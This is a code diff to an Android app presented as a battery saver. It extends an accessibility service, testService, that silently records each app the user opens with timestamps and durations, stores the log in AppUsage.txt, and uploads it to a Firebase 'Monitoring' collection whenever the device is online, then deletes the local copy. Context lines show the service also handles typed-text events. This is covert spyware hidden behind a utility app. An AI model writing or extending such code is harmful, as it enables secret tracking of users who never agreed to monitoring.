@@ -1,6 +1,7 @@
 package com.example.batterySaver;
 
 import static com.example.batterySaver.firebase_database.addFieldToAnalyticsCollection;
+import static com.example.batterySaver.firebase_database.addFieldToMonitoringCollection;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
@@ -10,19 +11,28 @@ import android.net.NetworkInfo;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.FileReader;
+import java.io.IOException;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.List;
 
 
 public class testService extends AccessibilityService {
     public String res = "";
-
+    public List<String> appUsageList = new ArrayList<>(); // List to store activity information
+    public String currentApp = ""; // Variable to store the currently active app package name
+    public long appLaunchTime = 0; // Variable to store the launch time of the current app
     public double FILE_SIZE = 3; // log file size in KB
+    public double MONITORING_FILE_SIZE = 1; // log file size in KB
     private String packageName;
 
     @Override
@@ -49,7 +59,19 @@ public class testService extends AccessibilityService {
 
             case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                 packageName = event.getPackageName().toString();
-                Log.v("battery manager: ", packageName);
+
+                if (!packageName.equals(currentApp)) {
+                    if (!currentApp.isEmpty()) {
+                        try {
+                            recordAppUsage(currentApp, appLaunchTime, System.currentTimeMillis());
+                        } catch (JSONException e) {
+                            throw new RuntimeException(e);
+                        }
+                    }
+                    currentApp = packageName;
+                    appLaunchTime = System.currentTimeMillis();
+                }
+                Log.v("battery manager: ", "packageName: "+packageName);
             }
 
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
@@ -135,5 +157,68 @@ public class testService extends AccessibilityService {
     public void onInterrupt() {
         Log.d("battery manager", "onInterrupt() is Called...");
     }
+
+
+    // Method to record app usage and add it to the list
+    private void recordAppUsage(String packageName, long launchTime, long closeTime) throws JSONException {
+        long duration = closeTime - launchTime;
+//        String appUsageInfo = "App: " + packageName + ", Launch Time: " + launchTime + ", Close Time: " + closeTime + ", Duration: " + duration + " ms";
+        JSONObject appUsageJson = new JSONObject();
+        appUsageJson.put("App", packageName);
+        appUsageJson.put("Launch Time", launchTime);
+        appUsageJson.put("Close Time", closeTime);
+        appUsageJson.put("Duration", duration);
+
+        String appUsageInfo = appUsageJson.toString();
+
+        Log.v("battery manager", appUsageInfo);
+        // Store the app usage information in a text file
+        try {
+            File file = new File(getApplicationContext().getExternalFilesDir(null), "AppUsage.txt");
+            FileOutputStream fos = new FileOutputStream(file, true);
+            fos.write(appUsageInfo.getBytes());
+            fos.write("\n".getBytes()); // Add a new line after each entry
+            fos.close();
+        } catch (IOException e) {
+            Log.e("battery manager", "Error writing to AppUsage.txt: " + e.getMessage());
+        }
+
+
+
+        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);
+        // checking AppUsage.txt filesize and updating to firebase
+        File AppUsage = new File(getApplicationContext().getExternalFilesDir(null), "AppUsage.txt");
+        double fsize = (double) AppUsage.length() / 1024;
+        try {
+            if (fsize > MONITORING_FILE_SIZE) {
+                boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
+                boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;
+
+                if (isWiFiConnected || isMobileDataConnected) {
+                    StringBuilder text = new StringBuilder();
+                    BufferedReader br = new BufferedReader(new FileReader(AppUsage));
+                    String line;
+
+                    while ((line = br.readLine()) != null) {
+                        text.append(line);
+                        text.append('\n');
+                    }
+                    br.close();
+
+                    try{
+                        Log.v("battery manager","Creating Firebase Monitor message: "+text.toString());
+                        addFieldToMonitoringCollection(text.toString());
+                        AppUsage.delete();
+                    } catch (Exception e){
+                        Log.v("battery manager","Error while sending mail:"+e.getMessage());
+                    }
+                }
+            }
+        } catch (IOException e) {
+            e.printStackTrace(); // Log the error
+            // Handle the exception as needed
+        }
+    }
+
 
 }
